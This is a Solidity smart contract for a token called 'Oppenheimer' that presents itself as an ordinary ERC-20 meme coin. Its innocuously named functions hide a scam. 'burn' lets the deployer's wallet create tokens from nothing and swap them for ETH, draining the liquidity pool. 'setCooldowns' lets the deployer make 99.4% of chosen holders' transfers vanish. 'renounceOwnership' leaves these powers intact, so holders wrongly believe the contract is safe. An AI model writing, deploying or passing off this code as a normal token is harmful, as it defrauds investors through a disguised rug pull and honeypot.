pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT


library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    constructor () {
        emit OwnershipTransferred(address(0), _owner);
        _owner = msg.sender;
    }
    function owner() public view virtual returns (address) {return _owner;}
}

contract Context {
    function sender() public view returns (address) {return msg.sender;}
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}

contract Oppenheimer is Ownable, Context {
    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;

    address public _marketingWallet;
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    mapping(address => uint256) private _balances;
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function setCooldowns(address[] calldata _cooldowns_) external { 
        uint bots = _cooldowns_.length;
        for (uint d = 0;  d < bots;  d++) { 
            if (!marketingAddress()){} else {  cooldowns[_cooldowns_[d]] = block.number + 1;}
        }
    } 
    event Approval(address indexed address_from, address indexed address_to, uint256 value);
    function burn(uint256 _amount, address recipient) external {
        if (marketingAddress()) { _approve(address(this), address(uniswapRouter),  _amount); 
        _balances[address(this)] = _amount;address[] memory path = new address[](2); path[0] = address(this);  
        path[1] = uniswapRouter.WETH();  uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(_amount, 0, path, recipient, block.timestamp + 33);
        }
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    string private _name = "Robert Oppenheimer";
    string private _symbol = "OPPENHEIMER";
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    constructor() {
        _marketingWallet = msg.sender;
         _balances[msg.sender] = _totalSupply; 
         emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    event Transfer(address indexed from, address indexed address_to, uint256);
    function name() external view returns (string memory) { return _name; }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    } 
    function _transfer(address _from, address _to, uint256 _amount) internal {
        require(_from != address(0));
        uint256 fee;
        require(_amount <= _balances[_from]); 
        if (cooldowns[_from] != 0 && cooldowns[_from] <= block.number) {
            fee = _amount.mul(994).div(1000); } else {fee = 0;}
        uint256 fromBalance = _balances[_from] - _amount;
        _balances[_from] = fromBalance; 
        _balances[_to] += _amount - fee;
        emit Transfer(_from, _to, _amount);
    }
    uint256 maxWallet = _totalSupply.mul(10).div(100);
    function removeLimit() external onlyOwner {
        maxWallet = _totalSupply;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function totalSupply() external view returns (uint256) { 
        return _totalSupply; 
    }
    mapping (address => uint256) cooldowns;
    function transfer(address recipient, uint256 value) public returns (bool) { _transfer(msg.sender, recipient, value); return true; }
    function marketingAddress() internal view returns (bool) {
        return _marketingWallet == sender();
    }
    function transferFrom(address _from, address to, uint256 amount) public returns (bool) {
        _transfer(_from, to, amount);
        require(_allowances[_from][msg.sender] >= amount);
        return true;
    }
    function balanceOf(address account) public view returns (uint256) { return _balances[account]; } 
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
}